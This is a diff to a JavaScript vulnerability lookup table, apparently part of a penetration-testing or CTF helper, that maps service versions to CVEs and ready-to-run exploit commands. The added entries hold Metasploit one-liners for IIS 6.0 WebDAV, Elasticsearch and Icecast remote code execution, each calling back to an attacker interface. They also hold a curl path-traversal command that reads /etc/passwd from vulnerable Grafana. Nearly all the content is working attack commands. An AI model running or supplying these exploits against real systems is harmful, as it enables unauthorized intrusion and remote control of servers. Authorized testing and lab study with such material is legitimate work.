@@ -115,6 +115,31 @@ window.CS_VULN_MAP = [
     exploit: `msfconsole -q -x "use exploit/linux/http/webmin_backdoor; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set SSL true; set LHOST tun0; run"`,
     note: "password_change.cgi injection — unauth RCE, but only when 'prompt users with expired passwords' is enabled. Fixed in 1.930.",
   },
+  {
+    svc: "http", product: /microsoft[ -]?iis|iis httpd/i, ver: { eq: "6.0" },
+    title: "Microsoft IIS 6.0 WebDAV ScStoragePathFromUrl RCE", id: "CVE-2017-7269", sev: "high",
+    exploit: `msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set LHOST tun0; run"`,
+    note: "A long 'If' header in a PROPFIND overflows the WebDAV service — Server 2003 R2, IIS 6.0 only, WebDAV enabled. IIS 7.5/10 are unaffected.",
+  },
+  {
+    svc: "http", product: /grafana/i, ver: { re: /\b8\.(0\.[0-6]|1\.[0-7]|2\.[0-6]|3\.0)\b/ },
+    title: "Grafana 8.0.0–8.3.0 plugin path traversal (arbitrary file read)", id: "CVE-2021-43798", sev: "high",
+    exploit: `curl -s --path-as-is "http://<TARGET_IP>:<PORT>/public/plugins/alertlist/../../../../../../../../etc/passwd"`,
+    note: "Unauthenticated file read via /public/plugins/<id>/ traversal (any installed plugin id, e.g. alertlist). Patched in 8.0.7 / 8.1.8 / 8.2.7 / 8.3.1.",
+  },
+  // ── Search / streaming ───────────────────────────────────────────────────
+  {
+    svc: "elasticsearch", product: /elasticsearch/i, ver: { lt: "1.2" },
+    title: "Elasticsearch < 1.2 dynamic-script RCE", id: "CVE-2014-3120", sev: "high",
+    exploit: `msfconsole -q -x "use exploit/multi/elasticsearch/script_mvel_rce; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set LHOST tun0; run"`,
+    note: "Dynamic scripting is on by default before 1.2, so a crafted _search MVEL payload runs Java. Usually on 9200. (The later Groovy bypass is CVE-2015-1427.)",
+  },
+  {
+    svc: "icecast", product: /icecast/i, ver: { le: "2.0.1" },
+    title: "Icecast <= 2.0.1 header overflow", id: "CVE-2004-1561", sev: "high",
+    exploit: `msfconsole -q -x "use exploit/windows/http/icecast_header; set RHOSTS <TARGET_IP>; set RPORT <PORT>; set LHOST tun0; run"`,
+    note: "A request carrying 32 HTTP headers overwrites a return address (Win32 build). Fixed in 2.0.2; the modern 2.3+/2.4+ line is unaffected.",
+  },
   // ── TLS ──────────────────────────────────────────────────────────────────
   {
     svc: "ssl", product: /openssl/i, ver: { re: /1\.0\.1(?:[a-f])?(?![a-z0-9])/i },
